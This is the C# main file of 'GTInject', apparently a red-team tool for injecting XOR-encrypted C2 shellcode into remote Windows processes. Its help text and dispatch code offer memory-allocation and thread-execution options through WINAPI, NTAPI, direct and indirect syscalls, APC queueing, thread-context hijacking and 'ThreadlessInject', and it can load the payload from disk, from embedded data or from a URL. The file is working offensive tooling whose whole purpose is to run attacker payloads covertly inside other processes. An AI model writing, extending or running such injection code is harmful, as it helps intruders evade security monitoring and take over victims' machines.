using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Globalization;
using GTInject.memoryOptions;
using GTInject.Injection;
using System.Diagnostics;
using System.Diagnostics.SymbolStore;
using GTInject.Novel;
using System.Net.Sockets;

namespace GTInject
{
    internal class Inject
    {
        public enum sourceLocation
        {
            embedded,
            url,
            disk
        }
        public enum execCommands
        {
            threads,
            inject,
            encrypt,
            help
        }
  
        static void Main(string[] args)
        {
            var command = args[0];
            var enumcommandparse = Enum.TryParse<execCommands>(command, true, out var enumresult);
            if (!(enumcommandparse))
            {
                Console.WriteLine("Not a valid command, try GTInject.exe help\n");
            }
            else if (command.ToLower() == "help") 
            {
                string helptext = @"
Usage: GTInject.exe <module> <moduleArgs>
       GTInject.exe threads
       GTInject.exe encrypt pathToSource.bin MySecretXorKey
       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID

       GTInject.exe inject 100 100 SecretKey123 disk ""C:\path\to\xordShellcode.file\"" 1234 321

Modules: 
    Encrypt
    Threads
    Inject

Encrypt:
        -- GTInject.exe encrypt C2Shellcode.bin MySecretXorKey --
        For encrypting shellcode. Shellcode from your C2 will be multibyte XOR'd and written as output to a text file
        This is intended to help you use the injection option later
        This is also my utility for encrypting payloads to be used in runners

        Do this in preparation, not on the C2 victim machine.

Threads:
        -- GTInject.exe threads alertable 10234 --
        Specify 'alertable' or 'all' threads
        Optionally specify a process ID
        Default will list all threads in an alertable state for all processes. Filters out low integrity processes to avoid isolated AppContainer threads.

Inject:
        -- GTInject.exe inject 100 102 MySecretXorKey disk 'C:\path\to\shellcode.bin' 10243 --
        Choose a technique for allocating the memory 
        Then choose a technique for executing the thread
        Enter the XorKey to decrypt it with
        Specify a location type where the encrypted shellcode is stored 
            - embedded 0
            - url https://example.globetech.biz/hostedShellcode.b64
            - disk 'C:\path\to\xord-shellcode.bin'
        Specify the PID
        Optionally specify the Thread Id after the Process ID -- gtinject.exe 100 101 MySecretXorKey embedded 0 10452 1337

100 Series - WINAPI
200 Series - NTAPI 
300 Series - Syscalls
400 Series - Misc Techniques

Memory Options
        100. WINAPI  -- VirtualAllocEx, WriteProcessMemory
        200. NTAPI   -- NtCreateSection, NtMapViewOfSection, RtlCopyMemory
        201. NTAPI   -- NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
        300. SysCall -- Direct, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory 
        301. SysCall -- Direct, NtCreateSection, NtMapViewOfSection, RtlCopyMemory
        302. SysCall -- Indirect, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
        303. SysCall -- Indirect, NtCreateSection, NtMapViewOfSection, RtlCopyMemory

ThreadExec Options
        100. WINAPI  -- CreateRemoteThread
        101. WINAPI  -- QueueUserAPC, ResumeThread - Must Specify Thread ID
        102. WINAPI  -- GetThreadContext, SetThreadContext - Thread ID Optional
        200. NTAPI   -- NtCreateThreadEx
        201. NTAPI   -- RtlCreateUserThread
        202. NTAPI   -- NtQueueApcThread, NtResumeThread - Must Specify Thread ID
        300. SysCall -- Direct, NtCreateThreadEx
        301. SysCall -- Direct, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
        302. SysCall -- Indirect, NtCreateThreadEx
        303. SysCall -- Indirect, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
        400. Novel   -- ThreadlessInject, CreateEventW - does not honor memory option
        401. Novel   -- ThreadlessInject, LoadLibraryExW - does not honor memory option

";
                Console.WriteLine(helptext);
             }

            else if (command.ToLower() == "encrypt")
            {
                string binPath = null;
                string xorkey = null;
                try
                {
                    binPath = args[1];
                    xorkey = args[2];
                }
                catch
                {
                    Console.WriteLine( "[-] You didn't include the needed arguments for GTInject.exe encrypt <sourceBinPath> <yourXorKeyString>");
                }
                EncryptBin.EncryptBin.EncryptShellcode(binPath, xorkey);
            }

            else if (command.ToLower() == "threads")
            {
                // Write to accept GTInject.exe threads all/alertable optionalPid
                string threadsToReturn = "alertable";
                int optionalPidForThreads = 0;
                try
                {
                    threadsToReturn = args[1];
                }
                catch  (IndexOutOfRangeException ex)
                {
                    Console.WriteLine("Returning Alertable Threads");
                }

                try
                {
                    optionalPidForThreads = int.Parse(args[2]);
                }
                catch (IndexOutOfRangeException ex)
                {
                    Console.WriteLine(" Optional PID not specified, assuming all processes\n"); // Default is all Processes 
                }

                // no longer bothering with a filter option, remove low and untrusted as they are typically going to be unreliable choices
                // bool filterUntrusted = true; // by default, remove untrusted / Low integrity processes from view - Things like AppContainer aren't often worth reviewing

                try { AlertableThreads.Alertable.GetThreads(threadsToReturn, optionalPidForThreads); } catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            }

            else if (command.ToLower() == "inject")
            {
                //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
                int memOption = 0;
                int execOption = 0;
                string xorkey = "0x00";
                string binSrcType = "";
                string binSrcPath = "";
                int Pid = 0;
                int Tid = 0;
                int resultvar = 0;
                try
                {
                    memOption = int.Parse(args[1]); //Int.TryParse(args[1]);
                    execOption = int.Parse(args[2]);
                    xorkey = args[3];
                    binSrcType = Enum.Parse(typeof(sourceLocation), args[4]).ToString();
                    // Enum.Parse(typeof(sourceLocation), binSrcType);
                    binSrcPath = args[5];
                    Console.WriteLine("     Shellcode will be called from {0} located at {1}", binSrcType, binSrcPath);
                    Pid = int.Parse(args[6]);
                    try
                    {
                        Tid = int.Parse(args[7]);
                    }
                    catch (IndexOutOfRangeException ex)
                    {
                        Console.WriteLine("     Tid not entered as an arg, not an issue at this point, just catch to handle the exception");
                        //Tid = 0;
                    }
                }
                catch (Exception ex) {
                    Console.WriteLine($"[-] Other exception : {ex.Message}");
                    return;
                }
                IntPtr memoryResponse = IntPtr.Zero;
                Process pidResp = null;

                //Check if Novel methods are chosen 
                //
                if (memOption >= 400 && memOption <= 499 || execOption >= 400 && execOption <= 499)
                {
                    // Special method, might not be following the standard 3 primitives for remote process injection
                    // Novel methods may be mutually exclusive. We won't be able to combine EX: We can't use MockingJay memoption with Threadless Inject Exec options
                    Console.WriteLine("     Novel injection method selected");
                    if (memOption >= 400 && memOption <= 499)
                    {
                        (memoryResponse, pidResp) = Novel.Novel.SelectNovelMemOption(memOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
                        if (memoryResponse != IntPtr.Zero || pidResp != null)
                        {
                            // Non null responses from the Novel Mem Options, indicates that it will honor traditional Thread Execution options
                            var resp = ThreadExec.SelectThreadOption(memoryResponse, execOption, pidResp, Tid);
                            return;
                        }
                        
                    }

                    // In the right circumstance, you could technically inject twice doing this, once in a valid memoption, and again here. 
                    if (execOption >= 400 && execOption <= 499)
                    {
                        // A.T.M. novel thread executions don't honor any mem exec options, so we don't care... yet. 
                        Novel.Novel.SelectNovelExecOption(execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);

                    }
                    return;
                }
                (memoryResponse, pidResp) = Memory.SelectMemOption(memOption, execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
                if (memoryResponse == IntPtr.Zero) { Console.WriteLine("[-] Failed to allocate memory, received and IntPtr 0 instead of a memory address"); }
                else
                {
                    System.Threading.Thread.Sleep(5000); // Play with the idea of a configurable delay between operations
                    ThreadExec.SelectThreadOption(memoryResponse, execOption, pidResp, Tid);
                    return;
                }
            }
 
        }
    }
}
